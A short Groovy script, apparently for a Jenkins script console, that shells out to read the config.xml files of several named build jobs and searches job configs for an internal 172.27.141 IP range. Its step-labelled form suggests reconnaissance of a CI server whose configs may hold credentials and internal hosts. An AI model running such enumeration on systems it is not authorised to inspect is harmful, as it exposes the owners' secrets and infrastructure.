// MICRO-H: Read critical Jenkins job configs (consumeProcessOutput)
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(15000)
    out.toString().take(4000)
}

def readConfig = { jobName ->
    def path = "/var/jenkins_home/jobs/${jobName}/config.xml"
    // try with subfolders
    def r = run("cat '${path}' 2>/dev/null | head -200")
    if (!r) {
        // Try nested
        r = run("find /var/jenkins_home/jobs -path '*${jobName}/config.xml' 2>/dev/null | head -1 | xargs cat 2>/dev/null | head -200")
    }
    r
}

["sears-ia-backend", "t1comercios", "amx_operaciones"].each { job ->
    println "\n=== JOB: ${job} ==="
    def c = readConfig(job)
    println c ?: "(not found at root)"
}

// Also read the tienda and caja-api jobs (they're nested)
println "\n=== cs_legacy_pipe_build_tienda (nested) ==="
def r1 = run("find /var/jenkins_home/jobs -path '*cs_legacy_pipe_build_tienda/config.xml' 2>/dev/null | head -1 | xargs cat 2>/dev/null")
println r1.take(3000)

println "\n=== cs_legacy_pipe_build_caja-api (nested) ==="
def r2 = run("find /var/jenkins_home/jobs -path '*caja-api/config.xml' 2>/dev/null | head -3")
def p1 = run("find /var/jenkins_home/jobs -path '*caja-api/config.xml' 2>/dev/null | head -1 | xargs cat 2>/dev/null")
println "Found paths: ${r2}"
println p1.take(3000)

// Look for any job with 172.27.141 IP in config (not builds)
println "\n=== CONFIG.XML with 172.27.141 (not in builds) ==="
def r3 = run('find /var/jenkins_home/jobs -name config.xml -not -path "*/builds/*" | xargs grep -l "172\\.27\\.141" 2>/dev/null')
println r3 ?: "(none)"

println "\n=== DONE MICRO-H ==="
